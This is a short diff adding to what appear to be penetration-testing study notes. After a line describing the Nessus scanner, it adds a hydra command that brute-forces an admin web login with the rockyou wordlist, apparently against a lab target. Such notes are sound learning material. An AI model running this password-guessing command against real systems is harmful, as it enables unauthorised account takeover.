@@ -135,3 +135,8 @@ FINDING CAPABILITIES
 
 *
 Nessus is an automated scanner which runs on port `8834`. It mixes functions of nmap, nikto or zap together and provides many profiles calles `Policies`
+
+
+*
+Finding password for admin based on request and error message:
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.63.60 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V`
